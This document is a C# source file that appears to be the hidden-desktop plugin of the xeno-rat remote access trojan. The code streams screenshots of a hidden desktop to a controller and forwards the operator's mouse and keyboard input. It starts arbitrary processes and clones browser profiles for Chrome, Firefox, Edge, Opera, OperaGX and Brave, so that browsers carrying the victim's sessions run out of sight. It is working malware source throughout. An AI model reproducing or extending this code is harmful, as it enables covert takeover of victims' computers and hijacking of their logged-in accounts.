using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;
using Hidden_handler;
using System.IO;
using System.Drawing;
using System.Threading;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Management;
using System.Diagnostics;

namespace Plugin
{
    public class Main
    {
        Node ImageNode;
        bool playing = false;
        int quality = 100;
        bool do_browser_clone = false;
        bool cloning_chrome = false;
        bool cloning_firefox = false;
        bool cloning_edge = false;
        bool cloning_opera = false;
        bool cloning_operagx = false;
        bool cloning_brave = false;
        bool has_clonned_chrome = false;
        bool has_clonned_firefox=false;
        bool has_clonned_edge = false;
        bool has_clonned_opera = false;
        bool has_clonned_operagx = false;
        bool has_clonned_brave = false;
        Imaging_handler ImageHandler;
        input_handler InputHandler;
        Process_Handler ProcessHandler;

        /// <summary>
        /// Sets the awareness level of the current process to the specified DPI awareness level.
        /// </summary>
        /// <param name="awareness">The DPI awareness level to be set for the current process.</param>
        /// <returns>Returns 0 if the function succeeds; otherwise, an error code.</returns>
        [DllImport("SHCore.dll", SetLastError = true)]
        public static extern int SetProcessDpiAwareness(int awareness);

        /// <summary>
        /// Runs the specified node and performs various operations based on the received data.
        /// </summary>
        /// <param name="node">The node to be run.</param>
        /// <remarks>
        /// This method sends a byte array to the specified node to indicate that it has connected. If the sub-sub node is accepted, it sets the process DPI awareness to be aware of the DPI per monitor and starts a new thread for taking screenshots.
        /// It then receives the desktop name from the node and initializes image, input, and process handlers based on the received desktop name.
        /// While the node is connected, it continuously receives data and performs different operations based on the received data, such as setting flags, adjusting quality, handling input, and starting various browsers and processes.
        /// If an exception occurs during the execution of this method, it is caught and no action is taken. After the execution, it disconnects from the node and disposes of image and input handlers, and performs garbage collection.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            if (!await AcceptSubSubNode(node))
            {
                ImageNode?.Disconnect();
                node.Disconnect();
            }

            SetProcessDpiAwareness(2);//2 is being aware of the dpi per monitor

            Thread thread = new Thread(async()=>await ScreenShotThread());
            thread.Start();
            try
            {
                string DesktopName=Encoding.UTF8.GetString(await node.ReceiveAsync());
                ImageHandler = new Imaging_handler(DesktopName);
                InputHandler = new input_handler(DesktopName);
                ProcessHandler = new Process_Handler(DesktopName);
                while (node.Connected())
                {
                    byte[] data = await node.ReceiveAsync();
                    if (data == null)
                    {
                        ImageNode?.Disconnect();
                        break;
                    }
                    if (data[0] == 0)
                    {
                        playing = true;
                    }
                    else if (data[0] == 1)
                    {
                        playing = false;
                    }
                    else if (data[0] == 2)
                    {
                        quality = node.sock.BytesToInt(data,1);
                    }
                    else if (data[0] == 3)
                    {
                        uint msg = (uint)node.sock.BytesToInt(data,1);
                        IntPtr wParam = (IntPtr)node.sock.BytesToInt(data, 5);
                        IntPtr lParam = (IntPtr)node.sock.BytesToInt(data, 9);
                        new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
                    }
                    else if (data[0] == 4)
                    {
                        ProcessHandler.StartExplorer();
                    }
                    else if (data[0] == 5)
                    {
                        ProcessHandler.CreateProc(Encoding.UTF8.GetString(data,1,data.Length-1));
                    }
                    else if (data[0] == 6)
                    {
                        do_browser_clone = true;
                    }
                    else if (data[0] == 7)
                    {
                        do_browser_clone = false;
                    }
                    else if (data[0] == 8)
                    { //start chrome
                        if (do_browser_clone && !has_clonned_chrome)
                        {
                            has_clonned_chrome = true;
                            HandleCloneChrome();
                        }
                        else 
                        {
                            ProcessHandler.StartChrome();
                        }
                    }
                    else if (data[0] == 9)
                    { //start firefox
                        if (do_browser_clone && !has_clonned_firefox)
                        {
                            has_clonned_firefox = true;
                            HandleCloneFirefox();

                        }
                        else
                        {
                            ProcessHandler.StartFirefox();
                        }
                    }
                    else if (data[0] == 10)
                    { //start edge
                        if (do_browser_clone && !has_clonned_edge)
                        {
                            has_clonned_edge = true;
                            HandleCloneEdge();

                        }
                        else
                        {
                            ProcessHandler.StartEdge();
                        }
                    }
                    else if (data[0] == 11)
                    { //start edge
                        if (do_browser_clone && !has_clonned_opera)
                        {
                            has_clonned_opera = true;
                            HandleCloneOpera();

                        }
                        else
                        {
                            ProcessHandler.StartOpera();
                        }
                    }
                    else if (data[0] == 12)
                    { //start edge
                        if (do_browser_clone && !has_clonned_operagx)
                        {
                            has_clonned_operagx = true;
                            HandleCloneOperaGX();

                        }
                        else
                        {
                            ProcessHandler.StartOperaGX();
                        }
                    }
                    else if (data[0] == 13)
                    { //start edge
                        if (do_browser_clone && !has_clonned_brave)
                        {
                            has_clonned_brave = true;
                            HandleCloneBrave();

                        }
                        else
                        {
                            ProcessHandler.StartBrave();
                        }
                    }
                }
            }
            catch
            {

            }
            node.Disconnect();
            ImageNode?.Disconnect();
            ImageHandler?.Dispose();
            InputHandler?.Dispose();
            GC.Collect();

        }

        /// <summary>
        /// Retrieves the process ID of a specified process based on the command line and search string.
        /// </summary>
        /// <param name="processName">The name of the process to search for.</param>
        /// <param name="searchString">The string to search for within the command line of the process.</param>
        /// <returns>The process ID of the specified process if found; otherwise, returns -1.</returns>
        /// <remarks>
        /// This method asynchronously searches for a process with the specified name and checks if its command line contains the specified search string.
        /// If a matching process is found, the method returns its process ID. If no matching process is found, -1 is returned.
        /// </remarks>
        private async Task<int> GetProcessViaCommandLine(string processName, string searchString) {
            return await Task.Run(() =>
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher($"SELECT * FROM Win32_Process WHERE Name = '{processName}'");

                foreach (ManagementObject obj in searcher.Get())
                {
                    string commandLine = obj["CommandLine"]?.ToString();

                    if (commandLine != null && commandLine.Contains(searchString))
                    {
                        return Convert.ToInt32(obj["ProcessId"]);
                    }
                }

                return -1;
            });
        }

        /// <summary>
        /// Handles the cloning of Chrome browser.
        /// </summary>
        /// <remarks>
        /// This method asynchronously handles the cloning of the Chrome browser. It first checks if the cloning process is already in progress, and if not, sets the cloning flag to true.
        /// It then attempts to clone the Chrome browser using the <see cref="ProcessHandler.CloneChrome"/> method. If the cloning fails, it retrieves the process ID of the existing Chrome browser instance and attempts to kill it before retrying the cloning process.
        /// Once the cloning is successful, it starts the cloned Chrome browser using the <see cref="ProcessHandler.StartChrome"/> method and sets the cloning flag back to false.
        /// </remarks>
        /// <exception cref="Exception">
        /// An exception may be thrown if there is an error during the cloning or process handling.
        /// </exception>
        /// <returns>
        /// An asynchronous task representing the handling of the Chrome browser cloning process.
        /// </returns>
        private async Task HandleCloneChrome()
        {
            if (!cloning_chrome)
            {
                cloning_chrome = true;
                if (!await ProcessHandler.CloneChrome())
                {
                    int pid = await GetProcessViaCommandLine("chrome.exe", "ChromeAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneChrome();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartChrome();
                cloning_chrome = false;
            }
        }

        /// <summary>
        /// Handles the cloning of the Opera browser.
        /// </summary>
        /// <remarks>
        /// This method asynchronously handles the cloning of the Opera browser. It first checks if the cloning process is already in progress. If not, it sets the flag to indicate that the cloning process has started.
        /// It then attempts to clone the Opera browser using the <see cref="ProcessHandler.CloneOpera"/> method. If the cloning fails, it retrieves the process ID of the existing Opera browser instance and attempts to kill it before retrying the cloning process.
        /// Once the cloning is successful, it starts the cloned Opera browser using the <see cref="ProcessHandler.StartOpera"/> method and resets the cloning flag to indicate that the process has completed.
        /// </remarks>
        /// <exception cref="Exception">Thrown if an error occurs during the cloning process.</exception>
        /// <returns>A <see cref="Task"/> representing the asynchronous operation.</returns>
        private async Task HandleCloneOpera()
        {
            if (!cloning_opera)
            {
                cloning_opera = true;
                if (!await ProcessHandler.CloneOpera())
                {
                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneOpera();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartOpera();
                cloning_opera = false;
            }
        }

        /// <summary>
        /// Handles the cloning of OperaGX browser.
        /// </summary>
        /// <remarks>
        /// This method asynchronously handles the cloning of the OperaGX browser. It first checks if the cloning process is already in progress. If not, it sets the cloning flag to true and proceeds with the cloning process.
        /// If the cloning process fails, it attempts to kill the existing OperaGX process and retries the cloning process.
        /// Once the cloning is successful, it starts the cloned OperaGX browser and resets the cloning flag to false.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs during the cloning process.</exception>
        /// <returns>An asynchronous task representing the cloning operation.</returns>
        private async Task HandleCloneOperaGX()
        {
            if (!cloning_operagx)
            {
                cloning_operagx = true;
                if (!await ProcessHandler.CloneOperaGX())
                {
                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaGXAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneOperaGX();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartOperaGX();
                cloning_operagx = false;
            }
        }

        /// <summary>
        /// Handles the cloning of the Brave browser.
        /// </summary>
        /// <remarks>
        /// This method asynchronously handles the cloning of the Brave browser. It sets a flag to indicate that the cloning process is in progress and then proceeds to clone the Brave browser using the <see cref="ProcessHandler.CloneBrave"/> method.
        /// If the cloning process fails, it attempts to retrieve the process ID of the existing Brave browser instance and kills it before attempting to clone again. Once the cloning is successful, it starts the cloned Brave browser using the <see cref="ProcessHandler.StartBrave"/> method.
        /// </remarks>
        /// <exception cref="Exception">
        /// An exception may be thrown during the process of cloning the Brave browser, but it is caught and handled internally without affecting the overall functionality of the method.
        /// </exception>
        /// <returns>
        /// An asynchronous task representing the handling of the cloning process for the Brave browser.
        /// </returns>
        private async Task HandleCloneBrave()
        {
            if (!cloning_brave)
            {
                cloning_brave = true;
                if (!await ProcessHandler.CloneBrave())
                {
                    int pid = await GetProcessViaCommandLine("brave.exe", "BraveAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneBrave();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartBrave();
                cloning_brave = false;
            }
        }

        /// <summary>
        /// Handles the cloning of Firefox browser for automation purposes.
        /// </summary>
        /// <remarks>
        /// This method asynchronously handles the cloning of the Firefox browser for automation purposes.
        /// It first checks if the cloning process is already in progress. If not, it sets the flag to indicate that cloning is in progress.
        /// It then attempts to clone the Firefox browser using the <see cref="ProcessHandler.CloneFirefox"/> method.
        /// If the cloning process fails, it retrieves the process ID of any existing Firefox instance associated with the "FirefoxAutomationData" and attempts to kill it before re-attempting the cloning process.
        /// Once the cloning is successful, it starts the cloned Firefox browser using the <see cref="ProcessHandler.StartFirefox"/> method.
        /// </remarks>
        /// <exception cref="Exception">Thrown if there is an error during the cloning or process handling.</exception>
        /// <returns>An asynchronous task representing the handling of the cloning process.</returns>
        private async Task HandleCloneFirefox()
        {
            if (!cloning_firefox)
            {
                cloning_firefox = true;
                if (!await ProcessHandler.CloneFirefox())
                {
                    int pid = await GetProcessViaCommandLine("firefox.exe", "FirefoxAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneFirefox();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartFirefox();
                cloning_firefox = false;
            }
        }

        /// <summary>
        /// Handles the cloning of the Edge browser.
        /// </summary>
        /// <remarks>
        /// This method handles the cloning of the Edge browser. It first checks if the cloning process is already in progress. If not, it sets the cloning_edge flag to true and proceeds with the cloning process.
        /// The method then calls the ProcessHandler.CloneEdge() method asynchronously. If the cloning is unsuccessful, it attempts to retrieve the process ID of the Edge browser and kills the process.
        /// After killing the process, it again calls the ProcessHandler.CloneEdge() method. Finally, it starts the Edge browser using ProcessHandler.StartEdge() and sets the cloning_edge flag to false.
        /// </remarks>
        /// <exception cref="Exception">Thrown if there is an error during the cloning process.</exception>
        /// <returns>A Task representing the asynchronous operation.</returns>
        private async Task HandleCloneEdge()
        {
            if (!cloning_edge)
            {
                cloning_edge = true;
                if (!await ProcessHandler.CloneEdge())
                {
                    int pid = await GetProcessViaCommandLine("msedge.exe", "EdgeAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneEdge();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartEdge();
                cloning_edge = false;
            }
        }

        /// <summary>
        /// Takes a screenshot and sends it to the ImageNode asynchronously.
        /// </summary>
        /// <remarks>
        /// This method continuously takes screenshots while the ImageNode is connected and the 'playing' flag is set to true.
        /// It uses the ImageHandler class to capture the screenshot and then encodes it as a JPEG image with the specified quality.
        /// The encoded image data is then sent to the ImageNode using the SendAsync method.
        /// If any exceptions occur during the process, they are caught and ignored.
        /// </remarks>
        public async Task ScreenShotThread()
        {
            try
            {
                
                while (ImageNode.Connected())
                {
                    if (!playing)
                    {
                        await Task.Delay(500);
                        continue;
                    }
                    try
                    {
                        Bitmap img = ImageHandler.Screenshot();
                        EncoderParameters encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

                        ImageCodecInfo codecInfo = GetEncoderInfo(ImageFormat.Jpeg);
                        byte[] data;
                        using (MemoryStream stream = new MemoryStream())
                        {
                            img.Save(stream, codecInfo, encoderParams);
                            data= stream.ToArray();
                        }
                        await ImageNode.SendAsync(data);
                    }
                    catch
                    {

                    }
                }
            }
            catch { }
        }

        /// <summary>
        /// Retrieves the image codec information for the specified image format.
        /// </summary>
        /// <param name="format">The image format for which to retrieve the codec information.</param>
        /// <returns>The <see cref="ImageCodecInfo"/> object that corresponds to the specified <paramref name="format"/>. Returns null if no matching codec is found.</returns>
        /// <remarks>
        /// This method retrieves the array of available image encoders using <see cref="ImageCodecInfo.GetImageEncoders"/> method.
        /// It then iterates through the codecs and returns the codec information that matches the specified <paramref name="format"/>.
        /// If no matching codec is found, it returns null.
        /// </remarks>
        private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }

            return null;
        }

        /// <summary>
        /// Asynchronously accepts a sub-node and adds it to the current node's sub-nodes.
        /// </summary>
        /// <param name="node">The sub-node to be accepted and added.</param>
        /// <returns>True if the sub-node is successfully accepted and added; otherwise, false.</returns>
        /// <remarks>
        /// This method asynchronously receives an ID from the input <paramref name="node"/> and then searches for a matching node within the parent's sub-nodes.
        /// If a matching node is found, a confirmation message is sent to the input <paramref name="node"/> and the node is added as a sub-node to the current node.
        /// If no matching node is found, a rejection message is sent to the input <paramref name="node"/> and the method returns false.
        /// </remarks>
        public async Task<bool> AcceptSubSubNode(Node node)
        {
            byte[] id = await node.ReceiveAsync();
            if (id != null)
            {
                int nodeid = node.sock.BytesToInt(id);
                Node tempnode = null;
                foreach (Node i in node.Parent.subNodes)
                {
                    if (i.SetId == nodeid)
                    {
                        await node.SendAsync(new byte[] { 1 });
                        tempnode = i;
                        break;
                    }
                }
                if (tempnode == null)
                {
                    await node.SendAsync(new byte[] { 0 });
                    return false;
                }
                node.AddSubNode(tempnode);
                ImageNode = tempnode;
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
